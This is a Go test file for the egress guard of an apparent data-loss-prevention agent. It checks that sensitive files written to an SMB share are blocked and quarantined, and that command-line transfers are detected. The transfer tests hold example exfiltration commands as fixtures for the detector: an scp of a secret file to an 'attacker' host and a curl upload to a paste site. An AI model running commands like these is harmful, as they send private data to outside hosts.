package egress

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"cep-local-dlp-agent/pkg/dmtoken"
	"cep-local-dlp-agent/pkg/webprotect"
)

type mockNotifier struct {
	blockedTargets []string
	warnAllowed    bool
}

func (m *mockNotifier) NotifyBlock(target, ruleName, customMessage string) {
	m.blockedTargets = append(m.blockedTargets, target)
}

func (m *mockNotifier) PromptWarn(target, ruleName, customMessage string) bool {
	return m.warnAllowed
}

func newMockWebProtectServer(t *testing.T, blockTrigger string) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		_ = r.Body.Close()
		action := webprotect.ActionUnspecified
		ruleName := ""
		if strings.Contains(string(body), blockTrigger) {
			action = webprotect.ActionBlock
			ruleName = "Block-SMB-USB-Exfil"
		}
		respProto := &webprotect.ContentAnalysisResponse{
			RequestToken: "req-egress-1",
			Results: []webprotect.Result{
				{
					Tag:    "dlp",
					Status: webprotect.StatusSuccess,
					TriggeredRules: []webprotect.TriggeredRule{
						{
							Action:   action,
							RuleName: ruleName,
							RuleID:   "rule-99",
						},
					},
				},
			},
		}
		w.Header().Set("Content-Type", "application/x-protobuf")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write(respProto.MarshalProto())
	}))
}

func TestBuildProtocolURL(t *testing.T) {
	gotSMB := BuildProtocolURL("smb", `\\fileserver.corp.example\Finance_Share\Q4`)
	wantSMB := "https://local-protocol.internal/smb/fileserver.corp.example/finance_share/q4"
	if gotSMB != wantSMB {
		t.Fatalf("BuildProtocolURL(smb) = %q, want %q", gotSMB, wantSMB)
	}

	gotUSB := BuildProtocolURL("usb", "Drive-E:")
	wantUSB := "https://local-protocol.internal/usb/drive-e"
	if gotUSB != wantUSB {
		t.Fatalf("BuildProtocolURL(usb) = %q, want %q", gotUSB, wantUSB)
	}
}

func TestEgressGuardBlocksAndQuarantinesSMBFileWrite(t *testing.T) {
	wpSrv := newMockWebProtectServer(t, "TOP_SECRET_MY_NUMBER_123456789012")
	defer wpSrv.Close()

	smbDir := t.TempDir()
	quarantineDir := t.TempDir()

	// Pre-existing file before guard starts -> should be recorded in baseline and NOT scanned
	existingFile := filepath.Join(smbDir, "existing.txt")
	if err := os.WriteFile(existingFile, []byte("TOP_SECRET_MY_NUMBER_123456789012"), 0600); err != nil {
		t.Fatalf("write existing file: %v", err)
	}

	wpClient := webprotect.NewClient(wpSrv.URL)
	tok := &dmtoken.TokenInfo{
		DMToken:     "dm-test-token",
		UserEmail:   "user@example.com",
		DeviceName:  "test-pc",
		OSPlatform:  "Windows",
		TokenSource: "test",
	}
	notif := &mockNotifier{}

	guard := NewGuard(wpClient, tok, notif, nil)
	guard.QuarantineDir = quarantineDir
	guard.AddTarget(EgressTarget{
		Path:      smbDir,
		Kind:      KindSMB,
		Label:     `SMB (Z: -> \\fileserver\public)`,
		TargetURL: "https://local-protocol.internal/smb/fileserver/public",
	})

	// 1. Write a clean file -> should remain on SMB share
	cleanFile := filepath.Join(smbDir, "notes.txt")
	if err := os.WriteFile(cleanFile, []byte("harmless public meeting agenda"), 0600); err != nil {
		t.Fatalf("write clean file: %v", err)
	}
	if blocked := guard.ScanOnce(context.Background()); blocked != 0 {
		t.Fatalf("expected 0 blocked files for clean write, got %d", blocked)
	}
	if _, err := os.Stat(cleanFile); err != nil {
		t.Fatalf("expected clean file to remain on SMB share, stat err: %v", err)
	}

	// 2. Write a sensitive file -> should be BLOCKED, immediately removed from SMB share, and backed up in QuarantineDir
	secretFile := filepath.Join(smbDir, "customer_export.csv")
	if err := os.WriteFile(secretFile, []byte("id,secret\n1,TOP_SECRET_MY_NUMBER_123456789012\n"), 0600); err != nil {
		t.Fatalf("write secret file: %v", err)
	}
	if blocked := guard.ScanOnce(context.Background()); blocked != 1 {
		t.Fatalf("expected 1 blocked file for sensitive SMB write, got %d", blocked)
	}
	if _, err := os.Stat(secretFile); !os.IsNotExist(err) {
		t.Fatalf("expected blocked file to be removed from SMB share, but it still exists")
	}
	if len(notif.blockedTargets) != 1 {
		t.Fatalf("expected 1 block notification, got %d", len(notif.blockedTargets))
	}

	qEntries, err := os.ReadDir(quarantineDir)
	if err != nil || len(qEntries) != 1 {
		t.Fatalf("expected 1 local backup in quarantineDir, got %d (err=%v)", len(qEntries), err)
	}
}

func TestParseCLITransferArgs(t *testing.T) {
	tmpDir := t.TempDir()
	secretPath := filepath.Join(tmpDir, "secret.pdf")
	if err := os.WriteFile(secretPath, []byte("%PDF-1.4 secret content"), 0600); err != nil {
		t.Fatalf("write temp secret file: %v", err)
	}

	cmd := ParseCLITransferArgs(4321, []string{"/usr/bin/scp", "-P", "2222", secretPath, "attacker@external.example.com:/tmp/leak.pdf"})
	if cmd == nil {
		t.Fatalf("expected scp command to be parsed")
	}
	if cmd.Protocol != "scp" || len(cmd.LocalFiles) != 1 || cmd.LocalFiles[0] != secretPath {
		t.Fatalf("unexpected parsed scp command: %+v", cmd)
	}

	curlCmd := ParseCLITransferArgs(4322, []string{"curl", "-F", "file=@" + secretPath, "https://paste.example.com/upload"})
	if curlCmd == nil || len(curlCmd.LocalFiles) != 1 || curlCmd.LocalFiles[0] != secretPath {
		t.Fatalf("unexpected parsed curl upload command: %+v", curlCmd)
	}

	// Non-upload curl GET should be ignored
	if got := ParseCLITransferArgs(4323, []string{"curl", "-s", "https://example.com"}); got != nil {
		t.Fatalf("expected curl GET without -T/-F to be ignored, got %+v", got)
	}
}
